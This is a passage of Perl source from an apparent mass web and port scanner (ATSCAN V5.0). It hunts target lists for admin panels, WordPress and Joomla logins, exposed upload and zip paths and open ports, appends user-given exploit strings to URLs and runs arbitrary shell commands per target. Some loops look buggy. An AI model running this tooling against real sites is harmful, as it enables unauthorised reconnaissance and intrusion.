	foreach $ADMIN(@ADMIN){
      my $URL = $Target.$ADMIN;
	  $URL =~ s/ //g;
      $request = HTTP::Request->new('GET', $URL);
      $response = $ua->request($request);
      my $html = $response->content;
	  
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$ADMIN \n";
		
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;
	  
	  my $pattern = 'password|username|email|Password|cPanel|admin';
	  if ($html =~ m/$pattern/i){
        if ( $response->is_success and $response->previous ) {
	      print color 'green';
          print '  ', $request->url, ' REDITECT TO: ', "\n";
	      print color RESET;
	      print color 'green';
		  print '              => ', $response->request->uri, "\n";
	      print color RESET;
	    } else {
	      print color 'green';
          print '  ',$response->request->uri, "\n";
	      print color RESET;
	    }
		$ul = $response->request->uri,;
		open (INFO, '>>scan.txt');
        print INFO "$ul\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Admin Page! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}

###################################################################		
## bgn msubdomain
sub msubdomain {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  SUBDOMAIN();
  if (!defined $mlevel) {
    targetlist();
  	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING SUBDOMAIN SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	if (index($Target, 'http://www.') != -1) {
	  $Target =~ s/http:\/\/www.//g;
	}
	if (index($Target, 'www.') != -1) {
	  $Target =~ s/www.//g;
	}
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] SUBDOMAIN SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;
	
	foreach $SUBDOMAIN(@SUBDOMAIN){
      my $URL = $SUBDOMAIN.$Target;
	  my $socket=IO::Socket::INET->new(
      PeerAddr=>"$URL",
      Proto=>'icmp',
      timeout=>1);
	  
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$SUBDOMAIN \n";
		
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;

	  if ($socket ne "") { 
	    print color 'green';
        print "http://$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$ul\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not a Subdomain! \n";
	    print color RESET;
	  }
	  close $socket;
    }
	
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}


###################################################################		
## bgn mwpsites
sub mwpsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING WORDPRESS SITES SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    $Target =~ s/\/.*//s;
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	

	print color 'bold magenta';
	timer();
	print "[$count/$lc] WORDPRESS SITES SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;
	  
    print color 'bold yellow';
	print "[!] CMS:    ";
	print color RESET;
	
	$query = "/wp-login.php";
    my $URL = $Target.$query;
	$URL =~ s/ //g;
    $request = HTTP::Request->new('GET', $URL);
    $response = $ua->request($request);
    my $html = $response->content;
    if ($response->is_success) {
	  print color 'green';
      print "Wordpress! \n";
	  print color RESET;
	  open (INFO, '>>scan.txt');
      print INFO "$Target\n";
      close (INFO);
	}else{
	  print color 'red';
      print "Not Wordpress! \n";
	  print color RESET;
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}

###################################################################		
## bgn mjoomsites
sub mjoomsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING JOOMLA SITES SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    $Target =~ s/\/.*//s;
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	

	print color 'bold magenta';
	timer();
	print "[$count/$lc] JOOMLA SITES SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;
	  
    print color 'bold yellow';
	print "[!] CMS:    ";
	print color RESET;
	
	$query = "/administrator/index.php";
    my $URL = $Target.$query;
	$URL =~ s/ //g;
    $request = HTTP::Request->new('GET', $URL);
    $response = $ua->request($request);
    my $html = $response->content;
	my $pattern = 'mod-login-password|username|submit|passwd';
	if ($html =~ m/$pattern/i){
	  print color 'green';
      print "Joomla! \n";
	  print color RESET;
	  open (INFO, '>>scan.txt');
      print INFO "$Target\n";
      close (INFO);
	}else{
	  print color 'red';
      print "Not Joomla! \n";
	  print color RESET;
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}

###################################################################		
## bgn muploadsites
sub muploadsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  UPLOAD();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING UPLOAD FILES SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    $Target =~ s/\/.*//s;
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] UPLOAD FILES SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;

	foreach $UPLOAD(@UPLOAD){
      my $URL = $Target.$UPLOAD;
      $request = HTTP::Request->new('GET', $URL);
      $response = $ua->request($request);
      my $html = $response->content;
	  
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$UPLOAD \n";
		
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;

	  if ( $response->is_success ) {
	    print color 'green';
        print "$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$Target\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Vulnerable! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}

###################################################################		
## bgn mzipsites
sub mzipsites {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  ZIP();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ZIP FILES SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    $Target =~ s/\/.*//s;
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] ZIP FILES SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;

	foreach $ZIP(@ZIP){
      my $URL = $Target.$ZIP;
      $request = HTTP::Request->new('GET', $URL);
      $response = $ua->request($request);
      my $html = $response->content;
	  
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$ZIP \n";
		
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;

	  if ( $response->is_success ) {
	    print color 'green';
        print "$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$Target\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Vulnerable! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}
###################################################################
## bgn mhttpd
sub mhttpd {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING HTTPD SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	my $printarget = $Target;
	$Target =~ s/\/.*//s;
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
	print color 'bold magenta';
	timer();
	print "[$count/$lc] HTTPD SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$printarget \n";
	print color RESET;
	
	print color 'bold yellow';
	print "[+] HTTPD:  ";
	print color RESET;
	
    my $URL = $Target;
    $useragent = LWP::UserAgent->new;
    $resp = $useragent->head($Target);
    if ($resp->is_success) {
      print color 'green';
      print "[!] ".$resp->headers_as_string;
      print color RESET;
    }else{
      print color 'red';
      print "\n    [!] Cannot reltreive headers!\n";
      print color RESET;
    }
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
  }
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

###################################################################		
## bgn misup
sub misup {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING HTTP 200 OK SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);

  my $browser = create_lwp_browser();
  my ($working, $broken, $odd) = get_status_codes($browser);
  sub get_status_codes {
    my $browser = shift;
    my $file='search.txt';
	$count=0;
    open (INFO,$file);
    my @lines = <INFO>;
    close(INFO);
    foreach my $Target (@lines) {
      chomp($Target);
	  $count++;
	  my $printarget = $Target;
	  if (defined $mtarget) {
	    $Target =~ s/\/.*//s;
	  }
      if ((defined $replace) && (defined $with)) {
	    if ($Target =~ m/$replace/i) {
		  $Target =~ s/$replace(.*)/$with/s;
	    }
      }
	  if (defined $exploit) {
	    $Target = $Target.$exploit;
	    $Target =~ s/ //g;
	  }
	  print color 'bold magenta';
	  timer();
	  print "[$count/$lc VALIDATION SCAN STARTING...]\n";
	  print color RESET;
	  print color 'bold yellow';
	  print "[+] TARGET: ";
	  print color RESET;
	  print color 'yellow';
      print "$printarget \n";
	  print color RESET;
	  if (defined $exploit) {
	    print color 'bold yellow';
	    print "[+] EXPL:   ";
	    print color RESET;
	    print "$exploit\n";
	  }
	  print color 'bold yellow';
	  print "[+] VALID:  ";
	  print color RESET;

      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
	  my $DEBUG = 1;
      my $response = $browser->get($Target);
      my $html = $response->content;
      if ($DEBUG){
	    if (($response->status_line =~ m/200 OK/i) &&  (!$response->previous) && ($html !~ m/not found/i) && ($html !~m/error/i)){
	      print color 'green';
          print("Valid! HTTP/1.1 ".$response->status_line."\n");
		  print color RESET;
	      open (INFO, '>>scan.txt');
          print INFO "$Target\n";
          close (INFO);
		}else{
	      print color 'red';
		  if ($response->status_line =~ m/200 OK/i) {
            print "Not Valid HTTP/ Undefined!\n";
		  }else{
            print("Not Valid HTTP/ ".$response->status_line."\n");
		  }
		  print color RESET; 
		}
      }
      print "[ ]............................................................................ \n";
    }
  }
 
  sub create_lwp_browser {
    my $browser = LWP::UserAgent->new;
    $browser->env_proxy;
    $browser->timeout(30);
    $browser->agent('link_check.pl/1.0');
    return $browser;
  }
  finmodule();
}	  
	  
###################################################################
## bgn mvalidation
sub mvalidation {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING VALIDATION SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	my $printarget = $Target;
	if (defined $mtarget) {
	  $Target =~ s/\/.*//s;
	}
    if ((defined $replace) && (defined $with)) {
	  if ($Target =~ m/$replace/i) {
		$Target =~ s/$replace(.*)/$with/s;
	  }
    }
	if (defined $exploit) {
	  $Target = $Target.$exploit;
	  $Target =~ s/ //g;
    }
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
	print color 'bold magenta';
	timer();
	print "[$count/$lc] VALIDATION SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$printarget \n";
	print color RESET;
    if (defined $exploit) {
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
	  print "$exploit\n";
	}
	print color 'bold yellow';
	print "[+] VALID:  ";
	print color RESET;
	
    my $URL = $Target;
    $request = HTTP::Request->new('GET', $URL);
    $response = $ua->request($request);
    my $html = $response->content;
	if($html =~ m/$validation_text/i){
	  print color 'green';
      print "Valid!\n";
	  print color RESET;
	  open (INFO, '>>scan.txt');
      print INFO "$Target\n";
      close (INFO);
    }else{
	  print color 'red';
      print "Not Valid! \n";
	  print color RESET;
	}
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
  }
  finmodule();
}

###################################################################		

###################################################################		
sub mmd5 {
  scandetail();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING MD5 GENERATOR...\n";
  print "[ ]............................................................................ \n";
  print color RESET;

  forwait();
  print color 'green';
  print "[+] MD5 => ";
  print Digest::MD5->md5_hex("$mmd5");
  print "\n";
  print color RESET;
}

###################################################################		
sub mencode64 {
  scandetail();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ENCODE BASE64...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  forwait();
  my $sss=encode_base64($mencode64);
  print color 'green';
  print "[!] Base64 encoded => $sss\n";
  print color RESET;
}

###################################################################		
sub mdecode64 {
  scandetail();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING DECODE BASE64...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  forwait();
  my $rrr=decode_base64($mdecode64);
  print color 'green';
  print "[!] Base64 decoded => $rrr \n";
  print color RESET;
}

###################################################################
## bgn mcommand
sub mcommand {
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING COMMAND EXTERN SUBPROCESS...\n";
  print "[ ]............................................................................ \n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    if ((defined $replace) && (defined $with)) {
	  if ($Target =~ m/$replace/i) {
		$Target =~ s/$replace(.*)/$with/s;
	  }
    }
	if (defined $exploit) {
	  $Target = $Target.$exploit;
	}
	#if (defined $mtarget) {
	if ($command =~ m/--TARGET/i) {
	  $Target =~ s/\/.*//s;
	}elsif ($command =~ m/--FULL_TARGET/i) {
	  $Target =~ $Target;
	}
    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] COMMAND SUBPROCESS STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	
	print color 'bold yellow';
	print "[+] CMD:    ";
	print color RESET;
	
	$commandfull = $command;
	if ($commandfull =~ m/--TARGET/i) {
	  $commandfull =~ s/--TARGET/$Target/g;
	}elsif ($commandfull =~ m/--FULL_TARGET/i) {
	  $commandfull =~ s/--FULL_TARGET/$Target/g;
    }
    #$commandfull = $command." ".$Target;

	print "$commandfull\n";
    system($commandfull); 
    
    print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
  }
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}


##################################
sub basic {
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS BASIC SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	print color 'bold magenta';
	print "[!] TARGET: ";
	print color RESET;
	print "$Target \n";
	$Target=$Target;
    $type=$_[0];
    $closed1=0;
    @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach $port1(@PORTS){
      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
	  if (defined $socket) {
        close $socket;
	  }
	  print color 'bold yellow';
      print "    [+] TYPE:  ";
      print color RESET;
      print "$type  ";
	  print color 'bold yellow';
      print "PORT:  ";
      print color RESET;
      print "$port1  ";
	  print color 'bold yellow';
      print "INFO:  ";
      print color RESET;
      if ($closed1==0){
	    print color 'green';
        print "Open!\n";
		print color RESET;
      }else{
	    print color 'red';
        print "Closed!\n";
		print color RESET;
	  }
      $closed1=0;
    }
    print "[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

################################
sub basic2 {
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS BASIC SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	print color 'bold magenta';
	print "[!] TARGET: ";
	print color RESET;
	print "$Target \n";
	$Target=$Target;
    $closed2=0;
    $closed3=0;
    @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
    foreach $port2(@PORTS){
       $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
	   if (defined $socket) {
         close $socket;
         $closed2=0;
	    }
        $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port2",Proto=>"udp",Timeout=>"0.5") or $closed3++;
		if (defined $socket2) {
          close $socket2;
	    }	
	    if ($closed2==0){
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed! \n";
        print color RESET;
	  }
	  
      if ($closed3==0){
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port2  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
	  $closed2=0;
      $closed3=0;
    }
    print "\n[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

#########################################
sub complete {
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS COMPLETE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $type2=$_[0];
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	$closed3=0;
    $port3=1;
	print color 'bold magenta';
	print "[!] TARGET: ";
	print color RESET;
	print "$Target \n";
    while ($port3<=65535){
      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
	  if (defined $socket) {
        close $socket;
	  }
	  print color 'bold yellow';
      print "    [+] TYPE:  ";
      print color RESET;
      print "$type2  ";

	  print color 'bold yellow';
      print "PORT:  ";
      print color RESET;
      print "$port3  ";
	  
	  print color 'bold yellow';
      print "INFO:  ";
      print color RESET;
	  
      if ($closed3==0){
	    print color 'green';
        print "Open!\n";
		print color RESET;
      }else{
	    print color 'red';
        print "Closed!\n";
		print color RESET;
	  }
    }
	$closed3=0;
    $port3++;
  }
  print "[ ]............................................................................ \n";
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

#####################################
sub complete2 {
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS COMPLETE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  $closed4=0;
  $closed5=0;
  $port4=1;
  while ($port4<=65535){
    open (TEXT, "search.txt");
    while (my $Target = <TEXT>) {
      $count++;
	  chomp $Target;
	  print color 'bold yellow';
	  print "[!] TARGET: ";
	  print color RESET;
	  print "$Target \n";
      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
	  if (defined $socket) {
        close $socket;
	  }
	  $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$port4",Proto=>"udp") or $closed5++;
	  if (defined $socket2) {
        close $socket2;
	  }
      if ($closed4==0){
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
      if ($closed5==0){
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
    }
    $closed4=0;
    $closed5=0;
    $port4++;
    print "[ ]............................................................................ \n";
  }
  
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

#########################################
sub subuser {
  if ((!defined $mstart) || (!defined $mend)) {
    print color 'yellow';
    print "[..][+] Type Start Of The Port : ";
    print color RESET;
    $mstart=<STDIN>;
    chomp($mstart);
    print color 'yellow';
    print "[..][+] Type End Of The Port : ";
    print color RESET;
    $mend=<STDIN>;
    chomp($mend);
  }
}

#########################################
sub user {
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS SELECTIVE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  if (defined $muser){
    $type3=$muser;
  }else{
    $type3=$_[0];
  }
  $count=0;
  $type3=$_[0];
  $closed6=0;
  while ($mstart<=$mend){
    open (TEXT, "search.txt");
    while (my $Target = <TEXT>) {
      $count++;
	  chomp $Target;
	  print color 'bold magenta';
	  print "    [!] TARGET: ";
	  print color RESET;
	  print "$Target\n";
      $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
      if (defined $socket) {
        close $socket;
	  }
	  print color 'bold yellow';
      print "    [+] TYPE:  ";
      print color RESET;
      print "$type3  ";

	  print color 'bold yellow';
      print "PORT:  ";
      print color RESET;
      print "$mstart  ";
	  
	  print color 'bold yellow';
      print "INFO:  ";
      print color RESET;
      if ($closed6==0){
	    print color 'green';
        print "Open!\n";
	    print color RESET;
	  }else{
		print color 'red';
        print "Closed!\n";
        print color RESET;
      }
    }
    $closed6=0;
    $mstart++;
    print "[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

##################################
sub user2 {
  testconection();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING PORTS SELECTIVE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;

  $closed7=0;
  $closed8=0;
  while ($mstart<=$mend){
	
    open (TEXT, "search.txt");
    while (my $Target = <TEXT>) { ###
	  chomp $Target;
	  $count++;
	  print color 'bold magenta';
	  print "[!] TARGET: ";
	  print color RESET;
	  print "$Target \n";
        $socket = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
	  if (defined $socket) {
        close $socket;
	  }
        $socket2 = IO::Socket::INET->new(PeerAddr=>"$Target",PeerPort=>"$mstart",Proto=>"udp") or $closed8++;
	  if (defined $socket2) {
        close $socket2;
	  }
      if ($closed7==0){
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$mstart  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "tcp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$mstart  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
	  
      if ($closed8==0){
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'green';
        print "Open!\n";
        print color RESET;
	  }else{
	    print color 'bold yellow';
        print "    [+] TYPE:  ";
        print color RESET;
        print "udp  ";
	    print color 'bold yellow';
        print "PORT:  ";
        print color RESET;
        print "$port4  ";
	    print color 'bold yellow';
        print "INFO:  ";
        print color RESET;
		print color 'red';
        print "Closed!\n";
        print color RESET;
	  }
    }
    $closed7=0;
    $closed8=0;
    $mstart++;
    print "[ ]............................................................................ \n";
  }
  print "\n";
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}

#################################################################################
##############################################################
sub mabout {
  print color 'bold cyan';
  print "
     [+]================================================================[+]
     [+]--------------              ATSCAN V 5.0          --------------[+]
     [+]================================================================[+]
     [+]--------------           AlisamTechnology         --------------[+]
     [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
     [+]------        https://www.youtube.com/user/aliartes       ------[+]
     [+]================================================================[+]
